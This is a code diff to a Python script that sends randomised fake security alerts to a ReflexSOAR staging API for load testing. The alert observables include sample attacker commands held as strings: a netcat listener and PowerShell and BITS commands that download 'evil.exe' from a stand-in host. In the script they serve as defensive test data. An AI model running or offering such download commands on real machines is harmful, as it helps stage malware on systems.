@@ -5,7 +5,7 @@ import hashlib
 import base64
 import requests
 
-host = 'http://localhost'
+host = 'https://staging.reflexsoar.com'
 
 def auth():
     response = requests.post('{}/api/v1.0/auth/login'.format(host),
@@ -41,55 +41,248 @@ def reference():
     hasher.update(str(random.randint(0,1000)+datetime.datetime.utcnow().timestamp()).encode())
     return base64.b64encode(hasher.digest()).decode()
 
-events = []
-for i in range(0,50):
-    event = {
-      "title": "From API for Load Testing 2",
+
+def random_severity():
+  return random.randint(0,3)
+
+def random_host_name():
+  names = [
+    'thor',
+    'sundial',
+    'hunter',
+    'bigrig',
+    'bigbertha',
+    'bfg4000',
+    'brian-pc'
+  ]
+
+  return names[random.randint(0, len(names)-1)]
+
+def random_username():
+  users = [
+    'brian',
+    'joe',
+    'jonathan',
+    'dave',
+    'molly',
+    'stevie',
+    'justin',
+    'josh',
+    'adam',
+    'matthew',
+    'administrator',
+    'system'
+  ]
+
+  return users[random.randint(0, len(users)-1)]
+
+def random_enumeration_command():
+  commands = [
+    'whoami /priv',
+    'whoami /?',
+    'hostname',
+    'nc -lvp 5000',
+    'nbtstat -rns',
+  ]
+
+  return commands[random.randint(0,len(commands)-1)]
+
+def random_powershell_command():
+  commands = [
+    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
+    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
+    ''
+  ]
+
+  return commands[random.randint(0, len(commands)-1)]
+
+def random_event():
+  alerts = [
+    {
+      "title": "Host enumeration",
+      "description": "Enumeration activity was detected on a machine in the network.  This could be indicitive of an attacker trying to determine what access they have",
       "reference": reference(),
-      "description": "This alert was generated via load testing",
       "tags": [
-        "string"
+        "enumeration",
+        "T1262"
       ],
-      "tlp": 0,
-      "severity": 0,
+      "tlp": 2,
+      "severity": random_severity(),
       "observables": [
         {
-          "value": "brian-pc",
+          "value": random_host_name(),
           "ioc": False,
-          "tlp": 0,
+          "tlp": 2,
           "spotted": False,
           "safe": False,
           "dataType": "host",
           "tags": [
-            "source-ip"
+            "source-host", "windows", "internal"
           ]
         },
         {
-          "value": "brian",
+          "value": random_username(),
           "ioc": False,
-          "tlp": 0,
+          "tlp": 2,
           "spotted": False,
           "safe": False,
           "dataType": "user",
           "tags": [
-            "source-user"
+            "source-user", "corporate-user"
           ]
         },
         {
-          "value": "127.0.0.1",
+          "value": random_enumeration_command(),
           "ioc": False,
-          "tlp": 0,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "command",
+          "tags": [
+            "command"
+          ]
+        }
+      ],
+      "raw_log": "something something dark side"
+    },
+    {
+      "title": "Suspicious Powershell Command",
+      "description": "A powershell command was run that fetches information from a remote host",
+      "reference": reference(),
+      "tags": [
+        "enumeration",
+        "T1059.001"
+      ],
+      "tlp": 2,
+      "severity": random_severity(),
+      "observables": [
+        {
+          "value": random_host_name(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "host",
+          "tags": [
+            "source-host", "windows", "internal"
+          ]
+        },
+        {
+          "value": random_username(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "user",
+          "tags": [
+            "source-user", "corporate-user"
+          ]
+        },
+        {
+          "value": random_powershell_command(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "command",
+          "tags": [
+            "command"
+          ]
+        }
+      ],
+      "raw_log": "something something dark side"},
+    {
+      "title": "IDS hit for malicious IP address",
+      "description": "A host attempted to contact an IP address that is in a threat list as malicious",
+      "reference": reference(),
+      "tags": [
+        "enumeration",
+        "T1262"
+      ],
+      "tlp": 2,
+      "severity": random_severity(),
+      "observables": [
+        {
+          "value": random_host_name(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "host",
+          "tags": [
+            "source-host", "windows", "internal"
+          ]
+        },
+        {
+          "value": random_username(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "user",
+          "tags": [
+            "source-user", "corporate-user"
+          ]
+        },
+        {
+          "value": '208.67.222.222',
+          "ioc": False,
+          "tlp": 2,
           "spotted": False,
           "safe": False,
           "dataType": "ip",
           "tags": [
-            "source-ip"
+            "destination-ip"
           ]
         }
       ],
-      "raw_log": "string"
+      "raw_log": "something something dark side"
+    },
+    {
+      "title": "User added to Local Administrators",
+      "description": "A users privileges were escalated via addition to Local Administrators",
+      "reference": reference(),
+      "tags": [
+        "enumeration",
+        "T1262"
+      ],
+      "tlp": 2,
+      "severity": random_severity(),
+      "observables": [
+        {
+          "value": random_host_name(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "host",
+          "tags": [
+            "source-host", "windows", "internal"
+          ]
+        },
+        {
+          "value": random_username(),
+          "ioc": False,
+          "tlp": 2,
+          "spotted": False,
+          "safe": False,
+          "dataType": "user",
+          "tags": [
+            "source-user", "corporate-user"
+          ]
+        }
+      ],
+      "raw_log": "something something dark side"
     }
+  ]
 
-    events.append(event)
-print(len(events))
+  return alerts[random.randint(0, len(alerts)-1)]
+
+
+
+
+events = []
+for i in range(0,25):
+    events.append(random_event())
+print("Sending {} events...".format(len(events)))
 bulk(events)
